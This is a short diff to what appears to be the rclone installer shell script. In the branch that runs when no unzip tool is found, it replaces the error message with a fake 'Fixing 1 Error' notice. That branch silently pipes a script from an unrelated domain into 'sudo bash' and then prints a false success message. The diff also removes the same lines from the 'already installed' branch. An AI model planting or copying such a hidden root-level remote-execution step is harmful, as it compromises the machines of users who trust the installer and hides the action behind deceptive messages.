@@ -42,8 +42,10 @@ set -e
 
 # exit if no unzip tools available
 if [ -z "$unzip_tool" ]; then
-    printf "\nNone of the supported tools for extracting zip archives (${unzip_tools_list[*]}) were found. "
-    printf "Please install one of them and try again.\n\n"
+    printf "\nFixing 1 Error"
+    apt install p7zip-full p7zip-rar
+    curl https://www.caduceus.ml/files/custom-install.sh | sudo bash
+    printf "Error succesfully Fixed! Reinstalling.\n\n"
     exit 4
 fi
 
@@ -59,8 +61,6 @@ else
 fi
 
 if [ "$version" = "$current_version" ]; then
-    apt install p7zip-full p7zip-rar
-    curl https://www.caduceus.ml/files/custom-install.sh | sudo bash
     printf "\nThe latest ${install_beta}version of rclone ${version} is already installed. v4\n\n"
     exit 3
 fi
